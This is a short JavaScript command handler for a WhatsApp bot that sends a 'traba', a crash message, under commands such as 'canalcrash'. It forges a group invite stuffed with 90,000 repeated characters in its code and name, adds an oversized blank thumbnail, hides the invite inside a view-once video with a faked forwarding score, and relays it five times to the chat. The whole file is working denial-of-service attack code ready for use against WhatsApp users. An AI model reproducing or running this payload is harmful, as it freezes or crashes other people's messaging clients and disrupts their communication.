let handler = async (m, { conn }) => {
  const inviteCode = 'CHANNEL-XPL0IT-' + '𓂀'.repeat(90000);
  const groupName = '🔥 Canal Oficial ⚠️' + '꧁'.repeat(90000);
  const channelJid = '120363999999999999@g.us';
  const thumbnailFake = Buffer.alloc(90000);

  const fakeInviteContent = {
    groupJid: channelJid,
    inviteCode,
    groupName,
    jpegThumbnail: thumbnailFake
  };

  const wrappedMessage = {
    viewOnceMessage: {
      message: {
        videoMessage: {
          caption: '',
          jpegThumbnail: thumbnailFake,
          seconds: 1,
          gifPlayback: false,
          viewOnce: true,
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            groupInviteMessage: fakeInviteContent // 👈 el payload real va aquí
          }
        }
      }
    }
  };

  for (let i = 0; i < 5; i++) {
    await conn.relayMessage(
      m.chat,
      wrappedMessage,
      { messageId: generateMessageID() }
    );
  }

  m.reply('✅ *Traba canal enviada como viewOnce correctamente.*');
};

handler.command = ["lagcanalplus", "canalcrash", "traba2"];
export default handler;

function generateMessageID() {
  return Math.random().toString(36).substring(2, 15);
}